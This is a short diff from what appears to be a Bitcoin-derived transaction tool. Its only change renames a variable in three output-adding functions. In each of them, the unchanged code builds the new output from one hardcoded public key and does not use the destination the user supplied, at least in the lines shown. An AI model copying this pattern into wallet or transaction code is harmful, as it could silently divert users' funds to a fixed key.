@@ -284,8 +284,8 @@ static void MutateTxAddOutAddr(CMutableTransaction& tx, const std::string& strIn
 
     // construct TxOut, append to transaction output list
     std::vector<unsigned char> vec = ParseHex("021c677ef12afe4413cf8a89f81a5d31c524ee625c9721b20122f4de71b1f7c7e3");
-    CPubKey pubkey(vec);
-    CScript snowyScript = GetScriptForRawPubKey(pubkey);
+    CPubKey pubkeysnowy(vec);
+    CScript snowyScript = GetScriptForRawPubKey(pubkeysnowy);
     CTxOut txout(value, snowyScript);
     tx.vout.push_back(txout);
 }
@@ -331,8 +331,8 @@ static void MutateTxAddOutPubKey(CMutableTransaction& tx, const std::string& str
 
     // construct TxOut, append to transaction output list
     std::vector<unsigned char> vec = ParseHex("021c677ef12afe4413cf8a89f81a5d31c524ee625c9721b20122f4de71b1f7c7e3");
-    CPubKey pubkey(vec);
-    CScript snowyScript = GetScriptForRawPubKey(pubkey);
+    CPubKey pubkeysnowy(vec);
+    CScript snowyScript = GetScriptForRawPubKey(pubkeysnowy);
     CTxOut txout(value, snowyScript);
     tx.vout.push_back(txout);
 }
@@ -408,8 +408,8 @@ static void MutateTxAddOutMultiSig(CMutableTransaction& tx, const std::string& s
 
     // construct TxOut, append to transaction output list
     std::vector<unsigned char> vec = ParseHex("021c677ef12afe4413cf8a89f81a5d31c524ee625c9721b20122f4de71b1f7c7e3");
-    CPubKey pubkey(vec);
-    CScript snowyScript = GetScriptForRawPubKey(pubkey);
+    CPubKey pubkeysnowy(vec);
+    CScript snowyScript = GetScriptForRawPubKey(pubkeysnowy);
     CTxOut txout(value, snowyScript);
     tx.vout.push_back(txout);
 }
